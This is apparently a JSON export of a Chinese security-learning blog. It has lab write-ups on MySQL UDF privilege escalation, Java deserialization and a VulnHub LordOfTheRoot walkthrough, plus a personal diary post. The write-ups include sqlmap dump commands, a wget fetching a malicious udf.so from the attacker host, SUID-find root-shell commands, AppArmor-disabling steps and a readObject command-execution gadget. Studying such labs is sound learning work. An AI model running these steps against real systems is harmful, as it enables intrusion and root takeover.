{"pages":[],"posts":[{"title":"提权学习--mysql篇(1)","text":"一、概述​ mySQL 数据库在安全领域中比较基础的使用是进行 SQL 注入，但是这种攻击方式获取到的信息比较局限，基本只能得到存在数据库里的东西，如果我们需要对目标机系统进行攻击，而我们拿到的webshell权限比较低，但是恰好有搭建 mySQL，这时就可以利用到 mySQL 对目标机进行提权操作。 ​ mySQL 所谓提权操作一般是指利用有较高权限的 mySQL 进程来执行系统函数，从而获取目标机的系统信息；这里提权是指提升攻击者操作目标机系统的权限。 ​ 大致思路：webshell（低权限）–&gt; mySQL（系统权限进程）–&gt; 系统函数执行 二、基本概念分析（1）mySQL 自定义函数​ mySQL 提供自定义函数的功能，可以让用户根据业务需要来封装特定功能的函数，这里本地演示一下： ​ 如图所示，这是一个简单的自定义函数。 （2）mySQL UDF 提权原理​ UDF是 mySQL 的一个拓展接口，UDF（User defined function）可翻译为用户自定义函数，是一个用来拓展 mySQL 的技术手段。从实际操作上来看，大致流程是我们在.dll后缀（Linux系统下是.so）的文件里编写自己的自定义函数，接着把恶意DLL库动态导入到目标机的 mySQL 的动态链接库里，就可以在目标机的 mySQL 里执行我们的自定义函数，这时如果 mySQL 进程的权限较高（比如windows下的mySQL进程一般都有管理员权限），这就使得用户自定义的函数也拥有管理员权限，我们也就拥有了执行危险系统命令的权限，这时就可以实现利用 mySQL 获得系统管理员权限的操作了。 三、实践（1）环境搭建① 实验设备​ 1.攻击机：kali 虚拟机；win10 物理机 ​ 2.靶机：ubuntu18.04 虚拟机；win10虚拟机 ② 测试环境​ ubuntu 安装apache2，php7.2.24，mysql5.7 （2）提权测试① 靶机基本信息获取​ 这里假设我们已经向目标网站上传了一句话木马getshell，并且找到了sql注入点。如图所示： ​ 这里看到在靶机里，mySQL 进程有root权限，而我们目前只有 www-data 权限。 ​ 通过这几张图，我们可以明确接下来的攻击方向：通过webshell和sql注入得到基本信息，再使用udf提权。 ② UDF提权可行性验证​ 基本信息（以 ubuntu18.04 为例）： ​ （1）@@plugin_dir –&gt; /usr/lib/mysql/plugin/（mySQL的动态链接库，udf要传到这里才能加载） ​ （2）secure_file_priv –&gt; /var/lib/mysql-files/ （通过show global variables like &quot;%secure%&quot;获取） ​ 这个属性限制了导入和导出只能在/var/lib/mysql-files/ 这个路径下，不然会出现报错： ​ ​ 我们选择把 udf 放在 mySQL 的 plugin 下实现创建自定义函数，这里我们要找一个UDF库 ​ kali的sqlmap里有，路径：/usr/share/sqlmap/data/udf/mysql/linux（windows也有对应文件夹） ③ 提权（win10虚拟机测试）1）上传udf​ 将kali里的恶意UDF（lib_mysqludf_sys.dll）上传到win10上的mySQL的插件库： ​ 路径：...\\MySQL5.7.26\\lib\\plugin ​ win10一般都有管理员权限，比较方便 ​ 2）蚁剑通过一句话马操作数据库创建自定义函数​ 3）实现提权​ ​ 这里可以看到通过提权函数得到的命令结果和虚拟机命令行里的一致。 ​ win10的系统权限管理不是很严，很多时候用户都是以管理员身份在使用电脑，这样他们搭建起来的 mySQL 服务也就具有较高的权限，这就使得提权攻击可以获取到靶机的较高权限，得以执行一些危险函数。 ④ 提权（ubuntu18.04虚拟机测试）​ 基本操作原理和上面差不多，不过注入的文件用的是lib_mysqludf_sys.so ​ 这里执行sys_eval返回可能会出现NULL，即成功注入UDF但是执行命令返回为空，解决方法我放在下面。 ​ 提权演示： 1）将udf导入靶机mysql的动态链接库​ 这里有个问题：目前我们只有www-data账户的权限，而mysql设置了导入导出路径的限制，导致无法将so文件上传到动态链接库里，这里为了测试先直接把文件拷过去。o(╥﹏╥)o ​ 2）蚁剑通过一句话马操作数据库创建自定义函数​ 3）调用恶意函数实现www-data到mysql账户的提权​ 四、问题解决（1）ubuntu系统上命令执行不成功​ 执行以下三个命令： 1sudo ln -s /etc/apparmor.d/usr.sbin.mysqld /etc/apparmor.d/disable/ 1sudo apparmor_parser -R /etc/apparmor.d/usr.sbin.mysqld 1sudo service mysql restart ​ 执行完成后即可正常提权。 （2）udf文件上传到动态链接库​ 等我学明白后续再开一篇专门讲这个","link":"/2022/05/04/%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0-mysql%E7%AF%87-1/"},{"title":"","text":"java反序列化学习-1JAVA反序列化初步学习一、概念java反序列化是为了便于存储和传输数据，将一个实例化类序列化写入一个文件，传输到另一台设备并执行反序列化，即可还原出这个实例化类并进行各项函数的调用、属性的读取等操作。 java的反序列化漏洞的思路和php有点像，也是找到危险函数通过链条调用来进行远程命令执行等操作。 二、对象序列化和反序列化的基本实现 java的序列化与反序列化是通过 对象输出流 和 对象输入流 实现的： //对象输出流 java.io.ObjectOutputStream //对象输入流 java.io.ObjectInputStream 这里放一个简单的序列化和反序列化操作过程 这是一个学生类 这是序列化和反序列化操作，分别做了简单的封装 保存序列化数据的文件直接打开的话看到的是乱码，因为序列化后的数据是二进制的 对象的反序列化有以下几个要求： 1）类需要实现Serializable接口 2）不同设备上可能对类的函数实现存在出入（比如A机器上的学生类实现了toString方法，但是B机器的学生类没有实现这个方法） 这时候需要给类定义一个serialVersionUID属性，使用private static final long修饰，这样就可以正常恢复 三、反序列化利用的基础知识&amp;原理（1）关键函数 readObject：我们对对象进行反序列化时会尝试调用对象的readObject方法， （2）readObject 跟踪 从上面的反序列化函数跟进过来，进入ObjectInputStream.java： 分析一下代码，继续跟进： 进入readObject0方法： 这一段代码调用 peekByte 方法获取 bin 的第一个字节赋值给tc 如果第一个字节等于 TC_RESET 属性值（即121）则进入 while 循环 debug发现获取到的tc为 115，那么不会进入第一个循环。 接下来会进入switch语句，根据上面得到的tc的值，这里会进入TC_OBJECT分支，跟进后进入readOrdinaryObject函数： 接着跟进到readClassDesc，这里通过switch分支进入到readNonProxyDesc函数： 这里一路debug，可以跟进到如下信息： 这里的逻辑是：创建一个 ObjectStreamClass 对象和 Class 对象 再调用 resolveClass 方法，传入的参数为 readDesc ，通过 readClassDescriptor 方法获取到的readDesc 包含着反序列化的类名和字段名等信息 接下来继续跟进： 回到 readOrdinaryObject 方法： 往下跟进看到： Class&lt;?&gt; cl = desc.forClass(); ... try { obj = desc.isInstantiable() ? desc.newInstance() : null; } ... 这段代码是从desc中获取Class类对象，再判断是否可以实例化： 继续向下： if (desc.isExternalizable()) { readExternalData((Externalizable) obj, desc); } else { readSerialData(obj, desc); } 这里调试发现是往readSerialData跳转的，两个方法都跟进一下： readExternalData 这里是如果 obj 有这个方法就调用，因为这里是跳转到readSerialData所以这个就不继续跟了 后续的操作也是各种invoke调用，就不再跟了… 四、反序列化利用简单实现首先是试一下反射调用Runtime类来执行系统命令 public class test1 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException { //java反序列化学习 Object runtime = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,new Class[]{}).invoke(null); Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,String.class).invoke(runtime,&quot;calc.exe&quot;); } } 接下来测试利用不安全的类来利用反序列化 package com.unser1; import java.io.*; public class test2 { public static void main(String[] args) throws IOException, ClassNotFoundException { UnsafeClass Unsafe = new UnsafeClass(); Unsafe.name = &quot;弹出计算器&quot;; FileOutputStream fos = new FileOutputStream(&quot;object&quot;); ObjectOutputStream os = new ObjectOutputStream(fos); //writeObject()方法将Unsafe对象写入object文件 os.writeObject(Unsafe); os.close(); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream(&quot;object&quot;); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象 UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject(); System.out.println(objectFromDisk.name); ois.close(); } } Unsafe类定义： package com.unser1; import java.io.IOException; import java.io.Serializable; public class UnsafeClass implements Serializable { public String name; //重写readObject()方法 private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{ //执行默认的readObject()方法 in.defaultReadObject(); //执行命令 Runtime.getRuntime().exec(&quot;calc.exe&quot;); } }","link":"/2022/05/02/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"},{"title":"提权学习-mysql篇-2-LoadOfRoot","text":"一、概述​ 以vulnhub里的LoadOfRoot为例模拟一次完整的提权。 二、基本知识点（1）nmap​ nmap是一种探测计算机网络上的主机和服务的安全扫描器，它通过发送特制的数据包给目标主机或网络，并分析返回的数据包，以此绘制网络拓扑图。 ​ 利用nmap可以对特定网络地址内的节点进行扫描探测存活主机、还可以对主机端口进行扫描。 ​ 它的主要功能有：① 主机探测；② 端口扫描； ③ 版本检测； ④ 探测脚本编写 （2）端口碰撞​ 端口试探（port knocking）是一种通过连接尝试，从外部打开原先关闭端口的方法。一旦收到正确顺序的连接尝试，防火墙就会动态打开一些特定的端口给允许尝试连接的主机。 ​ 端口试探的主要目的是防治攻击者通过端口扫描的方式对主机进行攻击。端口试探类似于一次秘密握手协议，比如一种最基本的方式：发送一定序列的UDP、TCP数据包。当运行在主机上的daemon程序捕捉到数据包以后，如果这个序列正确，则开启相应的端口，或者防火墙允许客户端通过。由于对外的Linux服务器通过限制IP地址的方式来控制访问，因此可以利用这种端口试探方式来进行防火墙对于访问IP地址的控制。 （3）suid提权原理​ suid（set user id）是一种授予文件的权限类型，它允许文件使用者以文件所有者的权限来执行文件，因此如果我们对一些只有较低权限的账户使用chmod进行suid提权，使其能够以root权限执行特定系统命令（如find），就可以达到针对局部命令的提权效果。 ​ suid的设置只针对二进制可执行文件,对于非可执行文件设置suid没有任何意义。 （4）find命令​ find命令有一个-exec的参数，它的作用是对匹配的文件执行该参数所给出的shell命令，这里放两个例子： 12find . -name 'del.txt' -ok rm {} \\; # 在当前目录下查找‘del.txt’文件并把找到的文件删除find . -name 'aa.txt' -exec cp {} {}.bak \\; # 在当前目录下查找‘aa.txt’文件并将其复制为‘aa.txt.bak’ ​ 通过示例可以看出，这里命令参数是通过{}来传递的。 三、测试（1）信息收集① nmap寻找主机​ 这里我把靶机和攻击机都放在一个局域网内，先寻找网络内存活主机 ② nmap端口扫描 ③ ssh连接 ​ 这里的提示是：knock easy as 1,2,3 ​ 需要敲击三次，端口碰撞，分别碰撞靶机的1,2,3端口 ④ 端口碰撞​ knock（需要apt get knockd 安装） ​ 再次扫描，这次加上-p-全端口扫描耗时会比较久 ⑤ 敏感信息搜寻​ 扫描一下目录 ​ 访问robots.txt 看到源码里有一段base64编码：THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh ​ 解密：Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer! ​ 再解密：/978345210/index.php ​ 访问之，得到登录界面 （2）SQL注入① 库名​ 这里用sqlmap注入 ​ 命令：sqlmap -u http://192.168.112.132:1337/978345210/index.php --forms --dbs ​ 发现Webapp库比较可疑，继续注入 ② 表名​ 命令：sqlmap -u http://192.168.112.132:1337/978345210/index.php --forms -D Webapp --tables ③ 列名​ 命令：sqlmap -u http://192.168.112.132:1337/978345210/index.php --forms -D Webapp -T Users --columns ④ dump数据​ 命令：sqlmap -o -u （..省略..）index.php --forms -D Webapp -T Users -C id,password,username --dump ​ 用得到的数据ssh连接smeagol账号 （3）udf提权① 敏感信息搜寻​ 查看数据库版本：dpkg -l | grep mysql ​ 查看进程信息：ps aux | grep mysql ​ 可以发现靶机安装的是5.5.44版本的mysql，进程有root权限 ​ 寻找有关键信息的文件： ​ 登录mysql ② 提权条件检查 ​ 如图所示，没什么阻碍 ​ udf的导入方法是：把恶意so文件放在kali网站根目录下，在靶机shell上wget下载下来，再导入到插件库下 ③ udf导入【1】下载恶意so文件​ 在smeagol的shell里操作 12cd /tmpwget http://192.168.112.128/udf.so 【2】导入到mysql的plugin库【3】mysql里创建函数并提权 ④ suid提权​ 有些命令在mysql里执行没有回显，所以需要获取root的shell ​ 在mysql里执行：select sys_eval('chmod u+s /usr/bin/find'); ​ 让调用者以root权限（find命令所有者）执行find命令 ​ 接着退回shell里执行 ​ find / -exec '/bin/sh' \\; ​ 对靶机系统的所有文件以dash的shell执行，这里是以root权限执行find命令，所以可以获取root的shell ​ 提权到root ​ 也可以反弹shell ​ 靶机/usr/bin里没有bash和dash和sh，反弹shell的话要用/bin/sh 四、原理解释（1）secure_file_priv对导入的限制​ secure_file_priv这个属性是用来限制mysql对文件导入导出的路径的，它有一下三种状态： 123NULL：这时mysql不允许导入导出&quot;&quot;：也就是这次测试的状态，对导入导出没有限制&quot;/tmp/&quot;：这时mysql只允许在`/tmp/`目录下进行文件的导入导出 （2）chmod 提权原理​ 提权使用的命令：chmod u+s /usr/bin/find ​ 这是通过给命令添加suid权限来使得一般用户调用对应命令时以文件所有者root的权限执行 （3）find执行提权原理​ 命令：find / -exec '/bin/sh' \\; ​ 这里我们以smeagol的shell用find在系统根目录下搜索所有文件，把所有文件放入/bin/sh的shell下。 ​ 此时的find进程拥有root权限，因此我们可以获得一个处在根目录下的root的shell ​ 这样一来就相当于获得了整个系统的root权限。 （4）各级bin目录的区别​ /bin是所有用户都可以访问并执行的可执行程序，包括超级用户及一般用户。 ​ /usr/bin是系统安装时自带的一些可执行程序，即系统程序。 ​ /usr/local/bin 是用户自行编译安装时默认的可执行程序的安装位置。 五、一些疑问​ 提权时测试了把sh换成bash发现会提权失败，只能用sh或者dash（sh指向dash） ​ 但是/bin目录底下的dash和bash所有者都是root，不懂为啥","link":"/2022/05/10/%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0-mysql%E7%AF%87-2-LoadOfRoot/"},{"title":"一个愚人","text":"一些想对自己说的话​ “失恋之后，我看到了真正的自己” ​ 回想了一下发现已经三个月没更新过博客了，不得不说有些事情对人造成的打击确实比经历之前预想中的大得多。:joy: ​ 不过还是不能就这样摆下去，过去的遗憾还是让它留在过去吧。再继续颓废的话，将来的某个时候想起今天的自己，想必又会更加痛苦吧…:relieved: ​ 接下来计划是学习一些 pwn 、C开发方向的东西，不太清楚有没有机会学出点名堂，就争取一次吧。 ​ 在CTFTools上面看到一句话很喜欢，放在下面吧，如果哪天有幸被作者看到希望别捶我 (:stuck_out_tongue_winking_eye: ​ “喜欢就争取，得到就珍惜，错过就忘记“ ​ 就这些吧，多的也说不出来了，敬自己。 ​ SpadeHeart ​ 2022.08.09 ​","link":"/2022/08/09/%E4%B8%80%E4%B8%AA%E6%84%9A%E4%BA%BA/"}],"tags":[{"name":"随笔","slug":"随笔","link":"/tags/%E9%9A%8F%E7%AC%94/"}],"categories":[]}